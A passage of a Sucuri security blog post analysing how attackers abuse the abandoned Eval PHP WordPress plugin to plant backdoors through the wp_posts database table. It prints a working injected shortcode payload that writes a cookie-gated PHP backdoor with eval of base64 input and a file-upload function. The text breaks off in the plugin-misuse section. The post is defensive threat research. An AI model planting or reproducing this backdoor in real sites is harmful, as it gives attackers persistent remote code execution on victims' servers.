---
title: Massive Abuse of an Abandoned Eval PHP WordPress Plugin
url: https://blog.sucuri.net/2023/04/massive-abuse-of-abandoned-evalphp-wordpress-plugin.html
source: Sucuri Blog
date: 2023-04-20
fetch_date: 2025-10-04T11:32:47.660772
---

# Massive Abuse of an Abandoned Eval PHP WordPress Plugin

[![Sucuri Blog](https://blog.sucuri.net/wp-content/uploads/2023/04/Sucuri_Blog_Header_Logo_342x60.png)](https://blog.sucuri.net/)

* Products
  + [Website Security Platform](https://sucuri.net/website-security-platform/)
  + [Website Firewall (WAF)](https://sucuri.net/website-firewall/)
  + [Multi-Site plans](https://sucuri.net/custom/agency/)
  + [Custom & Enterprise Plans](https://sucuri.net/custom/enterprise/)
  + [Partnerships](https://sucuri.net/partners/)
* Features
  + [Detection  Website Monitoring & Alerts](https://sucuri.net/malware-detection-scanning/)
  + [Protection  Future Website Hacks](https://sucuri.net/website-hack-protection/)
  + [Performance  Speed Up Your Website](https://sucuri.net/website-performance/)
  + [Response  Help For Hacked Websites](https://sucuri.net/website-malware-removal/)
  + [Backups  Disaster Recovery Plan](https://sucuri.net/website-backups/)
* Resources
  + [Guides](https://sucuri.net/guides/)
  + [Webinars](https://sucuri.net/webinars/)
  + [Infographics](https://sucuri.net/infographics/)
  + [Blog](/)
  + [SiteCheck](https://sitecheck.sucuri.net/)
  + [Reports](https://sucuri.net/reports/)
  + [Email Courses](https://sucuri.net/email-courses/)
* [Pricing](https://sucuri.net/website-security-platform/signup)
* [Immediate Help](https://sucuri.net/website-security-platform/help-now/)
* [Login](https://sucuri.net/website-security-platform/signup/)

[![Sucuri Blog](https://blog.sucuri.net/wp-content/uploads/2023/04/Sucuri_Blog_Header_Logo_342x60.png)](https://blog.sucuri.net/)

* Products
  + [Website Security Platform](https://sucuri.net/website-security-platform/)
  + [Website Firewall (WAF)](https://sucuri.net/website-firewall/)
  + [Multi-Site plans](https://sucuri.net/custom/agency/)
  + [Custom & Enterprise Plans](https://sucuri.net/custom/enterprise/)
  + [Partnerships](https://sucuri.net/partners/)
* Features
  + [Detection  Website Monitoring & Alerts](https://sucuri.net/malware-detection-scanning/)
  + [Protection  Future Website Hacks](https://sucuri.net/website-hack-protection/)
  + [Performance  Speed Up Your Website](https://sucuri.net/website-performance/)
  + [Response  Help For Hacked Websites](https://sucuri.net/website-malware-removal/)
  + [Backups  Disaster Recovery Plan](https://sucuri.net/website-backups/)
* Resources
  + [Guides](https://sucuri.net/guides/)
  + [Webinars](https://sucuri.net/webinars/)
  + [Infographics](https://sucuri.net/infographics/)
  + [Blog](/)
  + [SiteCheck](https://sitecheck.sucuri.net/)
  + [Reports](https://sucuri.net/reports/)
  + [Email Courses](https://sucuri.net/email-courses/)
* [Pricing](https://sucuri.net/website-security-platform/signup)
* [Immediate Help](https://sucuri.net/website-security-platform/help-now/)
* [Login](https://sucuri.net/website-security-platform/signup/)

* [Immediate Help](https://sucuri.net/website-security-platform/help-now/)

[Login](https://dashboard.sucuri.net/login/)

[Login](https://dashboard.sucuri.net/login)

New Customer?

[Sign up now.](https://sucuri.net/website-security-platform/signup/)

* [Submit a ticket](https://support.sucuri.net/support/?new)
* [Knowledge base](https://docs.sucuri.net/)
* [Chat now](https://sucuri.net/live-chat/)

Search for:

Search

* [Website Malware Infections](https://blog.sucuri.net/category/website-malware-infections)
* [Website Security](https://blog.sucuri.net/category/website-security)
* [WordPress Security](https://blog.sucuri.net/category/wordpress-security)

# Massive Abuse of Abandoned Eval PHP WordPress Plugin

[![](https://secure.gravatar.com/avatar/49a04d32074892dc04d9ed823aa114f8492a90e9c88852302b083c90aa322c21?s=60&d=mm&r=g)](https://blog.sucuri.net/author/benmartin)

[Ben Martin](https://blog.sucuri.net/author/benmartin)

* April 19, 2023

![Massive Abuse of EvalPHP WordPress Plugin](https://blog.sucuri.net/wp-content/uploads/2023/04/23-BlogPost_Feature-Image_1490x700_Massive-Abuse-of-EvalPHP-WordPress-Plugin-820x386.jpg)

Attackers are always finding new and creative ways to compromise websites and maintain their foothold in environments. This is frequently done via the use of backdoors: PHP scripts designed to allow attackers access and control even after you’ve changed your passwords and thought that the worst was over.

Since external scans are unable to see website backdoors they can often be identified through the usage of [server-side scans](https://docs.sucuri.net/website-monitoring/server-side-scanner/) and [file integrity monitoring](https://blog.sucuri.net/2021/05/server-side-scans-and-file-integrity-monitoring.html), which we offer as part of our services. This is also offered through a number of available WordPress security plugins that can be used on your website.

However, we recently started observing attackers making use of an unorthodox type of backdoor and reinfection method which would go completely undetected if website monitoring doesn’t happen to include the database.

**Contents:**

* **[Conventional backdoors](#backdoors)**
* **[Database injections](#database-injections)**
* **[Misuse of legitimate plugin](#misuse-plugin)**
* **[Malicious requests](#malicious-requests)**
* **[Pages with evalphp malware](#test-pages)**
* **[Why are attackers putting backdoors into wp\_posts?](#why-backdoors-wp_posts)**
* [**Mitigation steps to protect your environment**](#mitigation-steps)

## Conventional backdoors

Almost all of the time website backdoors are coded in the PHP programming language: the backbone of the modern web. WordPress itself (making up [over 40%+ of the web](https://w3techs.com/technologies/details/cm-wordpress)) is largely PHP based, as well as most other major CMS platforms like Joomla, Magento and others. PHP is an incredibly versatile language, which also means that it can be misused by attackers. One of the most common (mis)usages by attackers are backdoors.

According to our recent [2022 Website Threat Report](https://sucuri.net/webinars/2022-hacked-website-report/), we can see that remote code execution backdoors, webshells, and uploaders are the most popular among attackers to deploy to infected environments:

![Backdoor category distribution as seen in the 2022 website threat report](https://sucuri.net/wp-content/uploads/elementor/thumbs/23-sucuri-threat-report-backdoor-category-distribution-2022-q4hheetpiffkq9gm1wyd35kr6zvj6omgq5szl2lve6.png)

However, with good [file integrity monitoring and server side scanning](https://blog.sucuri.net/2021/05/server-side-scans-and-file-integrity-monitoring.html), backdoors can be effectively monitored for, detected, and removed to keep your websites safe from further attacks.

## Database injections

Over the last few weeks we noticed that some infected website’s databases were being injected with the following code into the **wp\_posts** table:

```
[evalphp]file_put_contents($_SERVER['DOCUMENT_ROOT'].'/7299b0773c8d.php','<?=409723*20;if(md5($_COOKIE[d])=="17028f487cb2a84607646da3ad3878ec"){echo"ok";eval(base64_decode($_REQUEST[id]));if($_POST["up"]=="up"){@copy($_FILES["file"]["tmp_name"],$_FILES["file"]["name"]);}}?>');[/evalphp]
```

This code is quite simple: It uses the **file\_put\_contents** function to create a PHP script into the docroot of the website with the specified remote code execution backdoor. All the attacker needs to do is to visit one of the infected posts or pages and the backdoor will be injected into the file structure.

It’s not exactly a new backdoor, however; more conventional PHP backdoors of this variety were found as early as last summer and over **6,000** instances of this backdoor were cleaned from compromised sites in the last 6 months alone. However, the backdoor being injected into the **database** is certainly a new and interesting development.

## Misuse of legitimate plugin

In the code sample above you may notice the **[evalphp]** WordPress shortcodes (small code tags used in WordPress environments that make it easy to add complex functionality to your website...